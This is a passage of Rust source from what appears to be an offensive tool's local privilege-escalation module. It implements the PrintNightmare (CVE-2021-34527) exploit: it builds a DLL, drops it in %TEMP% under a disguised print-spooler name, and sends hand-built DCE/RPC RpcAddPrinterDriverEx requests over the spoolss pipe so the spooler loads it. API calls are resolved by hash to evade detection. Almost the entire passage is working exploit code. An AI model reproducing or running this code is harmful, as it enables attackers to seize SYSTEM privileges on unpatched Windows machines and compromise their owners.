        buf[offset + 16..offset + 20].copy_from_slice(&raw_size.to_le_bytes());
        buf[offset + 20..offset + 24].copy_from_slice(&raw_off.to_le_bytes());
        buf[offset + 36..offset + 40].copy_from_slice(&chars.to_le_bytes());
    }

    // .text: RVA 0x1000, file 0x200, CNT_CODE | MEM_EXECUTE | MEM_READ
    write_section_header(
        &mut pe,
        0x148,
        b".text\0\0\0",
        0x200,
        0x1000,
        0x200,
        0x200,
        0x6000_0020,
    );
    // .idata: RVA 0x2000, file 0x400, CNT_INIT_DATA | MEM_READ | MEM_WRITE
    write_section_header(
        &mut pe,
        0x170,
        b".idata\0\0",
        0x200,
        0x2000,
        0x200,
        0x400,
        0xC000_0040,
    );
    // .rdata: RVA 0x3000, file 0x600, CNT_INIT_DATA | MEM_READ
    write_section_header(
        &mut pe,
        0x198,
        b".rdata\0\0",
        0x200,
        0x3000,
        0x200,
        0x600,
        0x4000_0040,
    );

    // ── Assemble final binary ────────────────────────────────────────────
    let mut dll = pe; // 0x000..0x1FF  headers
    dll.extend_from_slice(&code); // 0x200..0x3FF  .text
    dll.extend_from_slice(&idata); // 0x400..0x5FF  .idata
    dll.extend_from_slice(&rdata); // 0x600..0x7FF  .rdata
    dll
}

// ── Write DLL to %TEMP% ───────────────────────────────────────────────────

fn write_dll_to_temp(dll_bytes: &[u8], pid: u32) -> Result<Vec<u16>> {
    // Build path: GetTempPathA + filename
    type GetTempPathAFn = unsafe extern "system" fn(u32, *mut i8) -> u32;

    let dll_hash = pe_resolve::hash_str(b"kernel32.dll\0");
    let base = unsafe {
        pe_resolve::get_module_handle_by_hash(dll_hash)
            .ok_or_else(|| anyhow!("kernel32.dll not found"))?
    };

    let get_temp: GetTempPathAFn = unsafe {
        let addr =
            pe_resolve::get_proc_address_by_hash(base, pe_resolve::hash_str(b"GetTempPathA\0"))
                .ok_or_else(|| anyhow!("GetTempPathA not found"))?;
        std::mem::transmute(addr)
    };

    let mut temp_buf = [0i8; 260];
    let len = unsafe { get_temp(260, temp_buf.as_mut_ptr()) } as usize;
    if len == 0 {
        return Err(anyhow!("GetTempPathA returned empty path"));
    }

    let temp_str: String = temp_buf[..len].iter().map(|&c| c as u8 as char).collect();
    let dll_path_a = format!("{}msprint_{}.dll", temp_str, pid);

    // Write file via NtCreateFile + NtWriteFile
    type CreateFileAFn = unsafe extern "system" fn(
        *const i8,
        u32,
        u32,
        *mut std::ffi::c_void,
        u32,
        u32,
        *mut std::ffi::c_void,
    ) -> HANDLE;
    type WriteFileFn = unsafe extern "system" fn(
        HANDLE,
        *const std::ffi::c_void,
        u32,
        *mut u32,
        *mut std::ffi::c_void,
    ) -> i32;
    type CloseHandleFn = unsafe extern "system" fn(HANDLE) -> i32;

    let create_file: CreateFileAFn = unsafe {
        let addr =
            pe_resolve::get_proc_address_by_hash(base, pe_resolve::hash_str(b"CreateFileA\0"))
                .ok_or_else(|| anyhow!("CreateFileA not found"))?;
        std::mem::transmute(addr)
    };
    let write_file: WriteFileFn = unsafe {
        let addr = pe_resolve::get_proc_address_by_hash(base, pe_resolve::hash_str(b"WriteFile\0"))
            .ok_or_else(|| anyhow!("WriteFile not found"))?;
        std::mem::transmute(addr)
    };
    let close_handle: CloseHandleFn = unsafe {
        let addr =
            pe_resolve::get_proc_address_by_hash(base, pe_resolve::hash_str(b"CloseHandle\0"))
                .ok_or_else(|| anyhow!("CloseHandle not found"))?;
        std::mem::transmute(addr)
    };

    let path_c =
        std::ffi::CString::new(dll_path_a.as_str()).map_err(|e| anyhow!("bad dll path: {e}"))?;

    let file_handle = unsafe {
        create_file(
            path_c.as_ptr() as *const i8,
            0x4000_0000, // GENERIC_WRITE
            0,
            std::ptr::null_mut(),
            2, // CREATE_ALWAYS
            0x80,
            std::ptr::null_mut(),
        )
    };
    if file_handle == (-1isize) as HANDLE || file_handle.is_null() {
        return Err(anyhow!("CreateFileA failed for temp DLL at {}", dll_path_a));
    }

    let mut written = 0u32;
    let ok = unsafe {
        write_file(
            file_handle,
            dll_bytes.as_ptr() as *const std::ffi::c_void,
            dll_bytes.len() as u32,
            &mut written,
            std::ptr::null_mut(),
        )
    };
    unsafe { close_handle(file_handle) };

    if ok == 0 || written != dll_bytes.len() as u32 {
        return Err(anyhow!(
            "WriteFile failed for temp DLL (wrote {}/{} bytes)",
            written,
            dll_bytes.len()
        ));
    }

    tracing::debug!("lpe/print_spooler: DLL written to {}", dll_path_a);

    // Return path as wide string (null-terminated) for use in RPC call
    let wide: Vec<u16> = dll_path_a
        .encode_utf16()
        .chain(std::iter::once(0))
        .collect();
    Ok(wide)
}

fn delete_temp_dll(dll_path_wide: &[u16]) {
    type DeleteFileWFn = unsafe extern "system" fn(*const u16) -> i32;
    unsafe {
        if let Some(base) =
            pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"kernel32.dll\0"))
        {
            if let Some(addr) =
                pe_resolve::get_proc_address_by_hash(base, pe_resolve::hash_str(b"DeleteFileW\0"))
            {
                let f: DeleteFileWFn = std::mem::transmute(addr);
                f(dll_path_wide.as_ptr());
            }
        }
    }
}

// ── MS-RPRN RpcAddPrinterDriverEx via raw named-pipe RPC ─────────────────
//
// Sends a hand-crafted DCE/RPC BIND + REQUEST to \\.\pipe\spoolss to
// invoke RpcAddPrinterDriverEx (MS-RPRN opnum 0x3D) with our DLL path
// in pConfigFile.  This is the CVE-2021-34527 exploitation path.

const MS_RPRN_UUID: [u8; 16] = [
    0x78, 0x56, 0x34, 0x12, 0x34, 0x12, 0xCD, 0xAB, 0xEF, 0x00, 0x01, 0x23, 0x45, 0x67, 0x89, 0xAB,
];
const NDR_TRANSFER_UUID: [u8; 16] = [
    0x04, 0x5D, 0x88, 0x8A, 0xEB, 0x1C, 0xC9, 0x11, 0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 0x48, 0x60,
];

/// Build a DCE/RPC BIND PDU for the MS-RPRN interface.
fn build_rpc_bind_pdu() -> Vec<u8> {
    // Total size = 16 (common header) + 8 (bind-specific) + 4 (num ctx) + 44 (one context) = 72
    let frag_len: u16 = 72;
    let mut pdu = Vec::with_capacity(72);
    // Common header (16 bytes)
    pdu.push(5); // version major
    pdu.push(0); // version minor
    pdu.push(11); // ptype = BIND
    pdu.push(0x03); // flags = PFC_FIRST_FRAG | PFC_LAST_FRAG
    pdu.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]); // data representation (LE)
    pdu.extend_from_slice(&frag_len.to_le_bytes());
    pdu.extend_from_slice(&0u16.to_le_bytes()); // auth_length
    pdu.extend_from_slice(&1u32.to_le_bytes()); // call_id
                                                // Bind-specific (8 bytes)
    pdu.extend_from_slice(&0x1088u16.to_le_bytes()); // max_xmit_frag
    pdu.extend_from_slice(&0x1088u16.to_le_bytes()); // max_recv_frag
    pdu.extend_from_slice(&0u32.to_le_bytes()); // assoc_group_id
                                                // p_context_elem: num_context_items=1
    pdu.extend_from_slice(&1u32.to_le_bytes());
    // Presentation context
    pdu.extend_from_slice(&0u16.to_le_bytes()); // context_id = 0
    pdu.extend_from_slice(&1u16.to_le_bytes()); // num_transfer_syn = 1
    pdu.extend_from_slice(&MS_RPRN_UUID);
    pdu.extend_from_slice(&1u32.to_le_bytes()); // interface version 1.0
    pdu.extend_from_slice(&NDR_TRANSFER_UUID);
    pdu.extend_from_slice(&2u32.to_le_bytes()); // transfer syn version 2.0
    pdu
}

/// Encode a conformant varying wide string (NDR wchar_t* in/string).
fn ndr_wstr(s: &str) -> Vec<u8> {
    let utf16: Vec<u16> = s.encode_utf16().chain(std::iter::once(0)).collect();
    let n = utf16.len() as u32;
    let mut out = Vec::new();
    out.extend_from_slice(&n.to_le_bytes()); // MaxCount
    out.extend_from_slice(&0u32.to_le_bytes()); // Offset
    out.extend_from_slice(&n.to_le_bytes()); // ActualCount
    for &w in &utf16 {
        out.extend_from_slice(&w.to_le_bytes());
    }
    // Pad to 4-byte boundary
    while out.len() % 4 != 0 {
        out.push(0);
    }
    out
}

/// Build the NDR body for RpcAddPrinterDriverEx (opnum 0x3D).
///
/// Parameters:
///   pName              = NULL (local machine)
///   pDriverContainer   = { Level=2, DRIVER_INFO_2 { cVersion=3, pDriverPath=pDataFile=pConfigFile=dll_path } }
///   dwFileCopyFlags    = APD_COPY_ALL_FILES (0x4)
fn build_rpc_add_printer_driver_ndr(dll_path_wide: &[u16]) -> Vec<u8> {
    // Convert dll_path_wide back to a Rust String (without the trailing NUL)
    let dll_path_str: String =
        String::from_utf16_lossy(&dll_path_wide[..dll_path_wide.len().saturating_sub(1)]);

    let driver_name = "PrintNightmareDrv";
    let environment = "Windows x64";

    let mut body = Vec::new();

    // pName = NULL (unique pointer)
    body.extend_from_slice(&0u32.to_le_bytes());

    // DRIVER_CONTAINER.Level = 2
    body.extend_from_slice(&2u32.to_le_bytes());

    // Union discriminant = 2
    body.extend_from_slice(&2u32.to_le_bytes());

    // Level2 pointer referent (non-null)
    body.extend_from_slice(&0x0002_0004u32.to_le_bytes());

    // dwFileCopyFlags = APD_COPY_ALL_FILES (0x4) | APD_INSTALL_WARNED_DRIVER (0x8000)
    body.extend_from_slice(&0x8004u32.to_le_bytes());

    // Deferred DRIVER_INFO_2 content
    // cVersion = 3
    body.extend_from_slice(&3u32.to_le_bytes());
    // pName pointer
    body.extend_from_slice(&0x0002_0008u32.to_le_bytes());
    // pEnvironment pointer
    body.extend_from_slice(&0x0002_000Cu32.to_le_bytes());
    // pDriverPath pointer
    body.extend_from_slice(&0x0002_0010u32.to_le_bytes());
    // pDataFile pointer
    body.extend_from_slice(&0x0002_0014u32.to_le_bytes());
    // pConfigFile pointer (this triggers the DLL load in vulnerable spooler)
    body.extend_from_slice(&0x0002_0018u32.to_le_bytes());

    // Deferred string data
    body.extend_from_slice(&ndr_wstr(driver_name));
    body.extend_from_slice(&ndr_wstr(environment));
    body.extend_from_slice(&ndr_wstr(&dll_path_str)); // pDriverPath
    body.extend_from_slice(&ndr_wstr(&dll_path_str)); // pDataFile
    body.extend_from_slice(&ndr_wstr(&dll_path_str)); // pConfigFile

    body
}

/// Build a DCE/RPC REQUEST PDU wrapping an NDR body.
fn build_rpc_request_pdu(call_id: u32, opnum: u16, body: &[u8]) -> Vec<u8> {
    let frag_len = (24 + body.len()) as u16;
    let mut pdu = Vec::new();
    // Common header (16 bytes)
    pdu.push(5); // version major
    pdu.push(0); // version minor
    pdu.push(0); // ptype = REQUEST
    pdu.push(0x03); // flags
    pdu.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]); // data representation
    pdu.extend_from_slice(&frag_len.to_le_bytes());
    pdu.extend_from_slice(&0u16.to_le_bytes()); // auth_length
    pdu.extend_from_slice(&call_id.to_le_bytes());
    // Request header (8 bytes)
    pdu.extend_from_slice(&(body.len() as u32).to_le_bytes()); // alloc_hint
    pdu.extend_from_slice(&0u16.to_le_bytes()); // context_id
    pdu.extend_from_slice(&opnum.to_le_bytes());
    // Body
    pdu.extend_from_slice(body);
    pdu
}

/// Open the spooler's named-pipe RPC endpoint.
fn open_spooler_pipe() -> Result<HANDLE> {
    let pipe_path = std::ffi::CString::new(r"\\.\pipe\spoolss")
        .map_err(|e| anyhow!("pipe path CString: {e}"))?;

    type CreateFileAFn = unsafe extern "system" fn(
        *const i8,
        u32,
        u32,
        *mut std::ffi::c_void,
        u32,
        u32,
        *mut std::ffi::c_void,
    ) -> HANDLE;

    let f: CreateFileAFn = unsafe {
        let dll_hash = pe_resolve::hash_str(b"kernel32.dll\0");
        let base = pe_resolve::get_module_handle_by_hash(dll_hash)
            .ok_or_else(|| anyhow!("kernel32.dll not found"))?;
        let addr =
            pe_resolve::get_proc_address_by_hash(base, pe_resolve::hash_str(b"CreateFileA\0"))
                .ok_or_else(|| anyhow!("CreateFileA not found"))?;
        std::mem::transmute(addr)
    };

    // GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, OPEN_EXISTING
    let h = unsafe {
        f(
            pipe_path.as_ptr() as *const i8,
            0xC000_0000,
            3,
            std::ptr::null_mut(),
            3,
            0,
            std::ptr::null_mut(),
        )
    };
    if h == (-1isize) as HANDLE || h.is_null() {
        Err(anyhow!("OpenFile(\\\\pipe\\\\spoolss) failed"))
    } else {
        Ok(h)
    }
}

/// Write bytes to a named-pipe handle and read back a response.
fn pipe_transact(h: HANDLE, send: &[u8]) -> Result<Vec<u8>> {
    type WriteFileFn = unsafe extern "system" fn(
        HANDLE,
        *const std::ffi::c_void,
        u32,
        *mut u32,
        *mut std::ffi::c_void,
    ) -> i32;
    type ReadFileFn = unsafe extern "system" fn(
        HANDLE,
        *mut std::ffi::c_void,
        u32,
        *mut u32,
        *mut std::ffi::c_void,
    ) -> i32;

    let (write_file, read_file): (WriteFileFn, ReadFileFn) = unsafe {
        let dll_hash = pe_resolve::hash_str(b"kernel32.dll\0");
        let base = pe_resolve::get_module_handle_by_hash(dll_hash)
            .ok_or_else(|| anyhow!("kernel32.dll not found"))?;
        let wf = pe_resolve::get_proc_address_by_hash(base, pe_resolve::hash_str(b"WriteFile\0"))
            .ok_or_else(|| anyhow!("WriteFile not found"))?;
        let rf = pe_resolve::get_proc_address_by_hash(base, pe_resolve::hash_str(b"ReadFile\0"))
            .ok_or_else(|| anyhow!("ReadFile not found"))?;
        (std::mem::transmute(wf), std::mem::transmute(rf))
    };

    let mut written = 0u32;
    let ok = unsafe {
        write_file(
            h,
            send.as_ptr() as *const std::ffi::c_void,
            send.len() as u32,
            &mut written,
            std::ptr::null_mut(),
        )
    };
    if ok == 0 || written != send.len() as u32 {
        return Err(anyhow!("WriteFile to spoolss pipe failed"));
    }

    let mut resp = vec![0u8; 4096];
    let mut read = 0u32;
    unsafe {
        read_file(
            h,
            resp.as_mut_ptr() as *mut std::ffi::c_void,
            resp.len() as u32,
            &mut read,
            std::ptr::null_mut(),
        )
    };
    resp.truncate(read as usize);
    Ok(resp)
}

/// Send BIND + RpcAddPrinterDriverEx REQUEST over the spooler pipe.
fn invoke_ms_rprn_add_driver(dll_path_wide: &[u16]) -> Result<()> {
    let pipe_h = open_spooler_pipe()?;

    // 1. BIND
    let bind_pdu = build_rpc_bind_pdu();
    let bind_resp = pipe_transact(pipe_h, &bind_pdu)?;
    // BIND_ACK ptype=12; check that we got a positive response
    if bind_resp.len() < 3 || bind_resp[2] != 12 {
        unsafe { crate::syscall!("NtClose", pipe_h as u64).ok() };
        return Err(anyhow!(
            "MS-RPRN BIND failed: unexpected response ptype {:02X}",
            bind_resp.get(2).copied().unwrap_or(0xFF)
        ));
    }

    // 2. RpcAddPrinterDriverEx REQUEST (opnum 0x3D = 61)
    let ndr_body = build_rpc_add_printer_driver_ndr(dll_path_wide);
    let req_pdu = build_rpc_request_pdu(2, 0x3D, &ndr_body);
    let resp = pipe_transact(pipe_h, &req_pdu)?;

    unsafe { crate::syscall!("NtClose", pipe_h as u64).ok() };

    // ptype=2 = RESPONSE; any non-fault response means the call was dispatched
    if resp.len() >= 3 && resp[2] == 3 {
        // ptype=3 = FAULT
        Err(anyhow!("MS-RPRN RpcAddPrinterDriverEx returned FAULT"))
    } else {
        tracing::debug!(
            "lpe/print_spooler: RpcAddPrinterDriverEx dispatched ({} byte response)",
            resp.len()
        );
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn driver_container_layout() {
        // Verify the struct is not zero-sized and has reasonable alignment.
        assert!(std::mem::size_of::<DriverContainer>() > 0);
        assert!(std::mem::align_of::<DriverContainer>() >= 4);
    }

    #[test]
    fn print_nightmare_checks_structural() {
        // Structural test: check_spooler_vulnerability returns without panic
        // on non-Windows / non-functional syscall resolver.
        // The actual syscall will fail gracefully.
        let _ = check_spooler_vulnerability();
    }
}
